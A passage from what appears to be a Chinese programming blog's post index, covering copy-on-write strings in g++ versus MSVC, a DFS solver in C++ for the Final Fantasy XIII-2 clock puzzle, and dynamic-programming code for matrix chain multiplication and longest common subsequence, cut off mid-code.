<p>在 g++ 中，对字符串拷贝使用了 COW（Copy-On-Write）技术，即当一个 string 对象被复制时，不会立即复制内存块，而是共享同一个内存块，直到其中一个 string 对象要修改字符串内容时，才会复制内存块并分离出一个新的内存块。这样可以避免频繁的内存分配和复制，提高程序的性能。因此，如果两个 string 对象存储相同的字符串，它们可能会共享同一个内存块。</p>
<p>而在 MSVC 中，则不采用 COW 技术，而是每个 string 对象都分配自己的内存块来存储字符串。因此，如果两个 string 对象存储相同的字符串，它们会分别分配自己的内存块。</p>
<h1 id="COW-的缺点"><a href="#COW-的缺点" class="headerlink" title="COW 的缺点"></a>COW 的缺点</h1><p>MSVC 之所以不采用 COW 技术，可能是因为 COW 技术会带来一些额外的开销和复杂度。</p>
<p>首先，COW 技术需要额外的代码来实现内存共享和复制，这会带来一定的性能开销和内存占用。在某些情况下，这种开销可能会超过使用动态内存分配的开销。</p>
<p>其次，COW 技术会增加代码的复杂度和难度。由于需要处理内存共享和复制，代码的实现会变得更加复杂和难以维护。此外，COW 技术还可能会带来一些潜在的风险，如线程安全性问题等。</p>
<p>因此，不同的编译器实现可能会根据具体情况来选择是否采用 COW 技术。在一些情况下，COW 技术可以提高性能和效率，但在另一些情况下，它可能会带来额外的开销和复杂度。</p>
]]></content>
      <categories>
        <category>C++</category>
      </categories>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>用DFS解决最终幻想13-2时钟谜题</title>
    <url>/2022/08/08/%E7%94%A8DFS%E8%A7%A3%E5%86%B3%E6%9C%80%E7%BB%88%E5%B9%BB%E6%83%B313-2%E6%97%B6%E9%92%9F%E8%B0%9C%E9%A2%98/</url>
    <content><![CDATA[<p>最近在补 XGP 中的最终幻想13-2时，遇到一个时钟谜题，感觉挺有意思，就像尝试用搜索算法将其解决。</p>
<span id="more"></span>

<h1 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h1><p>如下图所示，有一个时钟，包含个结点，每个节点有一个数字标识，玩家最开始可以任意选择一个结点，选择后，该结点被消除且指针会指向该结点的位置，根据该节点的数字值 n 分裂为两根指针分别向顺时针方向和逆时针方向旋转 n 个的单位长度。此后每次玩家只能选择指针指向的结点，选择结点后结点被消除，两指针合并指向选择结点的位置并按上述描述进行分裂和旋转，玩家需要将所有节点消除才能胜利。</p>
<p>注：玩家无法选择已经被消除的结点，若分裂旋转后的两指针均位于已被消除的结点位置，则判定游戏失败。</p>
<p><img src="/2022/08/08/%E7%94%A8DFS%E8%A7%A3%E5%86%B3%E6%9C%80%E7%BB%88%E5%B9%BB%E6%83%B313-2%E6%97%B6%E9%92%9F%E8%B0%9C%E9%A2%98/1.jpg"></p>
<h1 id="算法思路"><a href="#算法思路" class="headerlink" title="算法思路"></a>算法思路</h1><p>本问题很容易想到利用<strong>深度优先搜索</strong>来解决，选择一个结点作为开始，如第一次选择 12 点钟位置的结点，（以下为了方便，按结点在时钟中排布位置 n 称作结点 n）该结点值为 5，则选中后分别向顺时针和逆时针方向旋转到达结点 5 和 结点 7，这就产生了两个分支（相当于二叉树的左右子树），分别选择这两个结点继续搜索，若结点到达了一个已被访问过的结点（即该结点已被消除），则终止该方向上的搜索，并进行回溯，将路径上的该结点删除，并将访问标志复原。</p>
<p>若路径上的结点个数已经达到 12，即所有节点均被成功消除，则该路径为一个解路径，将该结果保存并回溯继续进行搜索，直到尝试了所有可能性，算法结束。</p>
<h1 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h1><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;vector></span></span>
<span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span>
<span class="token keyword">private</span><span class="token operator">:</span>
    <span class="token keyword">int</span> n<span class="token punctuation">;</span>
    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> path<span class="token punctuation">;</span> <span class="token comment">// 搜索路径</span>
    vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> res<span class="token punctuation">;</span> <span class="token comment">// 成功路径</span>
    <span class="token keyword">void</span> <span class="token function">dfs</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> sequences<span class="token punctuation">,</span> vector<span class="token operator">&lt;</span><span class="token keyword">bool</span><span class="token operator">></span><span class="token operator">&amp;</span> visited<span class="token punctuation">,</span> <span class="token keyword">int</span> ind<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>visited<span class="token punctuation">[</span>ind<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 已访问过</span>
            <span class="token keyword">return</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        path<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>ind<span class="token punctuation">)</span><span class="token punctuation">;</span>
        visited<span class="token punctuation">[</span>ind<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 成功访问所有元素</span>
            res<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">int</span> p1 <span class="token operator">=</span> <span class="token punctuation">(</span>ind <span class="token operator">-</span> sequences<span class="token punctuation">[</span>ind<span class="token punctuation">]</span> <span class="token operator">+</span> n<span class="token punctuation">)</span> <span class="token operator">%</span> n<span class="token punctuation">;</span> <span class="token comment">// 逆时针方向旋转后的下标</span>
        <span class="token keyword">int</span> p2 <span class="token operator">=</span> <span class="token punctuation">(</span>ind <span class="token operator">+</span> sequences<span class="token punctuation">[</span>ind<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> n<span class="token punctuation">;</span> <span class="token comment">// 顺时针方向旋转后的下标</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span>p1 <span class="token operator">==</span> p2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token function">dfs</span><span class="token punctuation">(</span>sequences<span class="token punctuation">,</span> visited<span class="token punctuation">,</span> p1<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token function">dfs</span><span class="token punctuation">(</span>sequences<span class="token punctuation">,</span> visited<span class="token punctuation">,</span> p1<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">dfs</span><span class="token punctuation">(</span>sequences<span class="token punctuation">,</span> visited<span class="token punctuation">,</span> p2<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token comment">// 回溯</span>
        path<span class="token punctuation">.</span><span class="token function">pop_back</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        visited<span class="token punctuation">[</span>ind<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token keyword">public</span><span class="token operator">:</span>
    vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> <span class="token function">clockPuzzle</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> sequences<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        n <span class="token operator">=</span> sequences<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        vector<span class="token operator">&lt;</span><span class="token keyword">bool</span><span class="token operator">></span> visited<span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 选取一个结点作为开始结点</span>
            visited<span class="token punctuation">.</span><span class="token function">assign</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 重置visited数组 </span>
            <span class="token function">dfs</span><span class="token punctuation">(</span>sequences<span class="token punctuation">,</span> visited<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> res<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    Solution S<span class="token punctuation">;</span>
    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> sequences <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    <span class="token keyword">auto</span> res <span class="token operator">=</span> S<span class="token punctuation">.</span><span class="token function">clockPuzzle</span><span class="token punctuation">(</span>sequences<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">auto</span><span class="token operator">&amp;</span> re <span class="token operator">:</span> res<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">auto</span><span class="token operator">&amp;</span> r <span class="token operator">:</span> re<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            cout <span class="token operator">&lt;&lt;</span> r <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        cout <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="结果分析"><a href="#结果分析" class="headerlink" title="结果分析"></a>结果分析</h1><p>以下为示例图中问题的所有解路径，经验证，符合条件。</p>
<p><img src="/2022/08/08/%E7%94%A8DFS%E8%A7%A3%E5%86%B3%E6%9C%80%E7%BB%88%E5%B9%BB%E6%83%B313-2%E6%97%B6%E9%92%9F%E8%B0%9C%E9%A2%98/2.png"></p>
]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>游戏</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>算法分析与设计编程题 动态规划</title>
    <url>/2023/08/28/%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90%E4%B8%8E%E8%AE%BE%E8%AE%A1%E7%BC%96%E7%A8%8B%E9%A2%98%20%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/</url>
    <content><![CDATA[<h1 id="矩阵连乘"><a href="#矩阵连乘" class="headerlink" title="矩阵连乘"></a>矩阵连乘</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p><img src="/2023/08/28/%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90%E4%B8%8E%E8%AE%BE%E8%AE%A1%E7%BC%96%E7%A8%8B%E9%A2%98%20%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/matrix1.png"></p>
<p><img src="/2023/08/28/%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90%E4%B8%8E%E8%AE%BE%E8%AE%A1%E7%BC%96%E7%A8%8B%E9%A2%98%20%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/matrix2.png"></p>
<h2 id="解题代码"><a href="#解题代码" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">printOptimalParens</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span><span class="token operator">&amp;</span> partition<span class="token punctuation">,</span> <span class="token keyword">int</span> i<span class="token punctuation">,</span> <span class="token keyword">int</span> j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> j<span class="token punctuation">)</span> cout <span class="token operator">&lt;&lt;</span> <span class="token string">"A"</span> <span class="token operator">&lt;&lt;</span> i<span class="token punctuation">;</span> <span class="token comment">// 单个矩阵，无需划分</span>
	<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
		cout <span class="token operator">&lt;&lt;</span> <span class="token string">"("</span><span class="token punctuation">;</span>
		<span class="token function">printOptimalParens</span><span class="token punctuation">(</span>partition<span class="token punctuation">,</span> i<span class="token punctuation">,</span> partition<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">printOptimalParens</span><span class="token punctuation">(</span>partition<span class="token punctuation">,</span> partition<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">;</span>
		cout <span class="token operator">&lt;&lt;</span> <span class="token string">")"</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">// nums[i]: nums[0]为矩阵A1的行数，nums[i](i >= 1)表示矩阵Ai的列数</span>
<span class="token comment">// 如输入为 nums = &#123; 30,35,15,5,10,20,25 &#125;，代表矩阵行列数如下：</span>
<span class="token comment">// A1: 30 * 35, A2: 35 * 15, A3: 15 * 5, A4: 5 * 10, A5: 10 * 20, A6: 20 * 25</span>
<span class="token keyword">int</span> <span class="token function">matrixChainOrder</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
	<span class="token comment">// dp[i][j]表示矩阵链A[i～j]的最优解</span>
	vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> <span class="token function">dp</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token generic-function"><span class="token function">vector</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> INT32_MAX<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">// partition[i][j]表示矩阵链A[i～j]最优解对应的划分k</span>
	vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> <span class="token function">partition</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token generic-function"><span class="token function">vector</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// 矩阵链长度为1时，最优解为0</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> len <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>len<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// len为矩阵链长度</span>
		<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">+</span> len <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 矩阵链左端点i</span>
			<span class="token keyword">int</span> j <span class="token operator">=</span> i <span class="token operator">+</span> len <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">// 矩阵链右端点j</span>
			<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> i<span class="token punctuation">;</span> k <span class="token operator">&lt;=</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token operator">++</span>k<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 划分点k</span>
				<span class="token keyword">int</span> sum <span class="token operator">=</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">+</span> dp<span class="token punctuation">[</span>k <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+</span> nums<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">*</span> nums<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">*</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>
				<span class="token keyword">if</span> <span class="token punctuation">(</span>sum <span class="token operator">&lt;</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 更新最优解</span>
					dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> sum<span class="token punctuation">;</span>
					partition<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> k<span class="token punctuation">;</span>
				<span class="token punctuation">&#125;</span>
			<span class="token punctuation">&#125;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token function">printOptimalParens</span><span class="token punctuation">(</span>partition<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 打印最优方案</span>
	<span class="token keyword">return</span> dp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="最长公共子序列"><a href="#最长公共子序列" class="headerlink" title="最长公共子序列"></a>最长公共子序列</h1><h2 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h2><p><img src="/2023/08/28/%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90%E4%B8%8E%E8%AE%BE%E8%AE%A1%E7%BC%96%E7%A8%8B%E9%A2%98%20%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/lcs.png"></p>
<h2 id="解题代码-1"><a href="#解题代码-1" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">printLCS</span><span class="token punctuation">(</span><span class="token keyword">const</span> string<span class="token operator">&amp;</span> text1<span class="token punctuation">,</span> vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">>></span><span class="token operator">&amp;</span> dir<span class="token punctuation">,</span> <span class="token keyword">int</span> i<span class="token punctuation">,</span> <span class="token keyword">int</span> j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span> j <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>dir<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'S'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 向左上移动</span>
        <span class="token function">printLCS</span><span class="token punctuation">(</span>text1<span class="token punctuation">,</span> dir<span class="token punctuation">,</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        cout <span class="token operator">&lt;&lt;</span> text1<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 递归后再输出字符，以实现反向</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>dir<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'U'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 向上移动</span>
        <span class="token function">printLCS</span><span class="token punctuation">(</span>text1<span class="token punctuation">,</span> dir<span class="token punctuation">,</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 向左移动</span>
        <span class="token function">printLCS</span><span class="token punctuation">(</span>text1<span class="token punctuation">,</span> dir<span class="token punctuation">,</span> i<span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">longestCommonSubsequence</span><span class="token punctuation">(</span>string text1<span class="token punctuation">,</span> string text2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> m <span class="token operator">=</span> text1<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> n <span class="token operator">=</span> text2<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// dp[i][j]表示text1[0～i-1]和text2[0～i-1]的LCS</span>
    vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> <span class="token function">dp</span><span class="token punctuation">(</span>m <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token generic-function"><span class="token function">vector</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// dir[i][j]记录得到LCS的移动方向，以便构造最优解</span>
    vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">>></span> <span class="token function">dir</span><span class="token punctuation">(</span>m <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token generic-function"><span class="token function">vector</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> m<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>text1<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> text2<span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
                dir<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'S'</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">>=</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>
                dir<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'U'</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
                dir<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'L'</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">printLCS</span><span class="token punctuation">(</span>text1<span class="token punctuation">,</span> dir<span class="token punctuation">,</span> m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 构造最优解</span>
